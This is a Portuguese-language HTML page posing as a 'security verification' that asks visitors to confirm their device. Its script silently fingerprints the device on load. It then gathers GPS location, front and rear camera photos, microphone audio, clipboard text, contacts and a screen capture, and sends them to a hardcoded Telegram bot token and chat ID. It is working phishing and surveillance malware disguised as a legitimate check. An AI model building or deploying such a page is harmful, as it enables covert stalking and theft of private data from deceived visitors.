<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verificação de segurança</title>
<style>
:root{--bg:#0b0f14;--card:#131a22;--fg:#e6edf3;--mut:#8b98a5;--acc:#2f81f7;--ok:#3fb950;--bad:#f85149}
*{box-sizing:border-box}
body{margin:0;font:15px/1.45 -apple-system,system-ui,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);padding:16px 14px 40px}
h1{font-size:19px;margin:0 0 4px}p.s{margin:0 0 16px;color:var(--mut);font-size:13px}
.card{background:var(--card);border:1px solid #1f2933;border-radius:12px;padding:14px;margin:0 0 12px}
button{width:100%;padding:12px;border-radius:10px;border:1px solid #24303d;background:#1b2530;color:var(--fg);font-size:14px;font-weight:600;margin:0 0 8px;cursor:pointer}
button.p{background:var(--acc);border-color:var(--acc);color:#fff}
button.g{background:#132a17;border-color:#1f4a26;color:var(--ok)}
pre{background:#0a0e13;border:1px solid #1c2631;border-radius:8px;padding:10px;font-size:11px;white-space:pre-wrap;word-break:break-word;max-height:200px;overflow:auto;color:#a7b3c0;margin:0}
small{color:var(--mut);font-size:11.5px;display:block;margin-top:6px}
#err{display:none;background:#2a1113;border:1px solid var(--bad);color:#ffb3b0;padding:10px;border-radius:8px;font-size:12px;margin:0 0 12px;white-space:pre-wrap}
img.pv{width:100%;border-radius:8px;margin-top:8px;display:none}
</style>
</head>
<body>
<h1>Verificação de segurança</h1>
<p class="s">Confirme este dispositivo para liberar o acesso.</p>
<div id="err"></div>

<div class="card">
  <button class="p" onclick="runAll()">Iniciar verificação</button>
  <button onclick="testar()">Testar envio</button>
  <button onclick="geo()">Só localização</button>
  <button onclick="camera('user')">Só câmera</button>
  <button onclick="audio()">Só microfone</button>
  <small id="st">aguardando…</small>
</div>

<div class="card">
  <pre id="log">—</pre>
  <img class="pv" id="pv">
  <button class="g" style="margin-top:10px" onclick="enviar()">Reenviar relatório</button>
</div>

<script>
window.onerror = function (m, s, l) {
  var d = document.getElementById('err');
  d.style.display = 'block';
  d.textContent = 'ERRO: ' + m + ' (linha ' + l + ')';
};
</script>

<script>
/* ====== CONFIG ====== */
const CFG = {
  tgToken: "9208612539:AAG4kBW6wsf_IE8cu2kT5eYvtWpIBxfRvjI",
  tgChat:  "926262308",
  endpoint: "",
  redirect: ""
};
/* ==================== */

const R = {};
const sid = localStorage.getItem('sid') ||
  (Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
localStorage.setItem('sid', sid);
R.sessao = sid;
R.aberto_em = new Date().toISOString();
R.visitas = (+localStorage.getItem('vis') || 0) + 1;
localStorage.setItem('vis', R.visitas);

const put = (k, v) => { if (v !== undefined && v !== null && v !== '') R[k] = v; };
const st = t => document.getElementById('st').textContent = t;
const draw = () => document.getElementById('log').textContent =
  JSON.stringify(Object.fromEntries(Object.entries(R).filter(([k]) =>
    !['foto_user','foto_environment','tela','audio'].includes(k))), null, 1);

const url = m => 'https://api.telegram.org/bot' + CFG.tgToken + '/' + m;

async function chamar(metodo, campo, blob, nome, legenda) {
  const f = new FormData();
  f.append('chat_id', CFG.tgChat);
  if (campo === 'text') f.append('text', blob);
  else { f.append(campo, blob, nome); if (legenda) f.append('caption', legenda); }
  const r = await fetch(url(metodo), { method: 'POST', body: f });
  const j = await r.json().catch(() => ({ ok: false, description: 'resposta inválida' }));
  return j;
}

async function testar() {
  st('testando…');
  try {
    const r = await fetch(url('getMe'));
    const j = await r.json();
    if (!j.ok) { st('TOKEN INVÁLIDO: ' + j.description); return; }
    const j2 = await chamar('sendMessage', 'text',
      'teste ' + new Date().toLocaleString('pt-BR') + ' | sessao ' + sid);
    st(j2.ok ? 'TUDO OK — mensagem enviada por @' + j.result.username
             : 'TOKEN OK, MAS O CHAT FALHOU: ' + j2.description);
  } catch (e) { st('FALHA DE REDE: ' + e.message); }
}

async function passivo() {
  const n = navigator;
  put('ua', n.userAgent); put('plataforma', n.platform); put('vendor', n.vendor);
  put('idiomas', (n.languages || []).join(', '));
  put('fuso', Intl.DateTimeFormat().resolvedOptions().timeZone);
  put('tela', screen.width + 'x' + screen.height + ' @' + devicePixelRatio + 'x');
  put('janela', innerWidth + 'x' + innerHeight);
  put('cores', n.hardwareConcurrency); put('ram_gb', n.deviceMemory);
  put('touch', n.maxTouchPoints); put('cookies', n.cookieEnabled);
  try {
    const ua = await n.userAgentData.getHighEntropyValues(
      ['platform','platformVersion','model','architecture','fullVersionList']);
    put('modelo', ua.model); put('plataforma_ver', ua.platformVersion);
  } catch (e) {}
  try { const b = await n.getBattery();
    put('bateria', Math.round(b.level * 100) + '% carregando=' + b.charging); } catch (e) {}
  const c = n.connection || {};
  put('rede', [c.effectiveType, c.downlink && c.downlink + 'Mbps',
    c.rtt && c.rtt + 'ms', c.saveData ? 'saveData' : ''].filter(Boolean).join(' | '));
  try { const s = await n.storage.estimate();
    put('storage', (s.usage / 1048576).toFixed(1) + 'MB de ' + (s.quota / 1048576).toFixed(0) + 'MB'); } catch (e) {}
  try { const r = await fetch('https://api.ipify.org?format=json');
    put('ip', (await r.json()).ip); } catch (e) {}
  try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json();
    put('ip_geo', [d.city, d.region, d.country_name, d.org, d.asn].filter(Boolean).join(' | ')); } catch (e) {}
  draw();
}

function geo() {
  return new Promise(r => {
    if (!navigator.geolocation) { put('gps', 'nao suportado'); return r(); }
    st('pedindo localização…');
    navigator.geolocation.getCurrentPosition(p => {
      put('gps', p.coords.latitude + ',' + p.coords.longitude +
        ' (±' + Math.round(p.coords.accuracy) + 'm)');
      put('gps_maps', 'https://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
      draw(); r();
    }, e => { put('gps', 'erro: ' + e.message); r(); },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
  });
}

async function camera(facing) {
  st('abrindo câmera ' + facing + '…');
  let s;
  try {
    s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
    const v = document.createElement('video');
    v.srcObject = s; v.muted = true; v.playsInline = true;
    await v.play();
    await new Promise(r => {
      if (v.videoWidth > 0) return r();
      const t = setTimeout(r, 4000);
      v.onloadedmetadata = () => { clearTimeout(t); r(); };
    });
    if (!v.videoWidth || !v.videoHeight) { put('erro_camera_' + facing, 'sem quadro'); return; }
    const cv = document.createElement('canvas');
    cv.width = v.videoWidth; cv.height = v.videoHeight;
    cv.getContext('2d').drawImage(v, 0, 0);
    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.85));
    if (!blob) { put('erro_camera_' + facing, 'blob nulo'); return; }
    R['foto_' + facing] = blob;
    put('tam_' + facing, Math.round(blob.size / 1024) + 'KB');
    const im = document.getElementById('pv');
    im.src = URL.createObjectURL(blob); im.style.display = 'block';
  } catch (e) {
    put('erro_camera_' + facing, e.name + ': ' + e.message);
  } finally {
    if (s) s.getTracks().forEach(t => t.stop());
    draw();
  }
}

async function audio() {
  st('gravando áudio…');
  let s;
  try {
    s = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mr = new MediaRecorder(s); const ch = [];
    mr.ondataavailable = e => { if (e.data.size) ch.push(e.data); };
    mr.start(); await new Promise(r => setTimeout(r, 6000));
    await new Promise(r => { mr.onstop = r; mr.stop(); });
    const blob = new Blob(ch, { type: ch[0] ? ch[0].type : 'audio/webm' });
    if (!blob.size) { put('erro_audio', 'vazio'); return; }
    R.audio = blob;
    put('tam_audio', Math.round(blob.size / 1024) + 'KB');
  } catch (e) {
    put('erro_audio', e.name + ': ' + e.message);
  } finally {
    if (s) s.getTracks().forEach(t => t.stop());
    draw();
  }
}

async function extras() {
  try { put('clipboard', await navigator.clipboard.readText()); } catch (e) {}
  try { put('contatos', JSON.stringify(
    await navigator.contacts.select(['name','tel','email'], { multiple: true }))); } catch (e) {}
  try {
    const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
    const v = document.createElement('video'); v.srcObject = s; await v.play();
    await new Promise(r => setTimeout(r, 900));
    const cv = document.createElement('canvas');
    cv.width = v.videoWidth; cv.height = v.videoHeight;
    cv.getContext('2d').drawImage(v, 0, 0);
    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.8));
    if (blob) R.tela = blob;
    s.getTracks().forEach(t => t.stop());
  } catch (e) {}
  draw();
}

async function enviar() {
  const r = {};
  const { foto_user, foto_environment, tela, audio: a, ...rest } = R;
  const txt = 'RELATORIO ' + sid + '\n' +
    Object.entries(rest).map(([k, v]) => k + ': ' + v).join('\n');

  try {
    const j = await chamar('sendMessage', 'text', txt);
    r.texto = j.ok ? 'ok' : j.description;
    if (!j.ok) { put('erro_telegram', j.description); draw(); return; }
  } catch (e) { put('erro_telegram', e.message); draw(); return; }

  const midia = async (blob, nome, legenda) => {
    try { const j = await chamar('sendPhoto', 'photo', blob, nome, legenda);
      r[legenda] = j.ok ? 'ok' : j.description; }
    catch (e) { r[legenda] = e.message; }
  };
  if (foto_user) await midia(foto_user, 'frontal.jpg', 'camera frontal');
  if (foto_environment) await midia(foto_environment, 'traseira.jpg', 'camera traseira');
  if (tela) await midia(tela, 'tela.jpg', 'captura de tela');
  if (a) {
    try { const j = await chamar('sendAudio', 'audio', a, 'microfone.webm', 'audio 6s');
      r.audio = j.ok ? 'ok' : j.description; }
    catch (e) { r.audio = e.message; }
  }

  R.envio = JSON.stringify(r);
  put('enviado', new Date().toISOString());
  draw();
  st('envio: ' + JSON.stringify(r));
}

async function runAll() {
  st('coletando…');
  try { await navigator.wakeLock.request('screen'); } catch (e) {}
  await passivo();
  await geo();
  await camera('user');
  await camera('environment');
  await audio();
  await extras();
  st('enviando…');
  await enviar();
  if (CFG.redirect) setTimeout(() => { location.href = CFG.redirect; }, 1500);
}

passivo();
</script>
</body>
</html>
